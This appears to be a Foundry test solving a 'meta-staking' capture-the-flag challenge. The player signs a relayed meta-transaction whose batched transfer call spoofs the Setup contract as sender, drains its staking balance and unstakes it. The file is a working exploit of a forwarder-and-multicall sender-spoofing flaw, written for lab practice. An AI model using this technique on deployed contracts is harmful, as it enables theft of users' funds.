// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";
import { Setup } from "../src/meta-staking/Setup.sol";
import { Relayer } from "../src/meta-staking/Relayer.sol";
import { Staking } from "../src/meta-staking/Staking.sol";

contract MetaStakingTest is Test {
    address deployer = makeAddr("deployer");
    // address player = makeAddr("player");
    address player;
    uint256 playerPk;

    Setup setup;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        assertTrue(setup.isSolved(), "not solved");
        vm.stopPrank();
    }

    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);
        setup = new Setup();
        vm.stopPrank();
    }

    function test_meta_staking() public checkSolvedByPlayer {
        Relayer relayer = setup.relayer();
        Staking staking = setup.staking();

        bytes[] memory arg = new bytes[](1);
        arg[0] = abi.encodeWithSelector(staking.transfer.selector, player, staking.balanceOf(address(setup)), address(setup));

        Relayer.Transaction memory transaction = Relayer.Transaction({
            from: player,
            to: address(staking),
            value: 0,
            gas: 100000,
            data: abi.encodeWithSelector(staking.batchExecute.selector, arg)
        });
        bytes32 transactionHash = keccak256(abi.encode(transaction, relayer.nonce()));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, transactionHash);
        Relayer.Signature memory signature = Relayer.Signature({
            v: v, r: r, s: s, deadline: block.timestamp
        });
        Relayer.TransactionRequest memory request = Relayer.TransactionRequest({
            transaction: transaction,
            signature: signature
        });

        relayer.execute(request);
        staking.unstake(staking.balanceOf(player));
    }
}
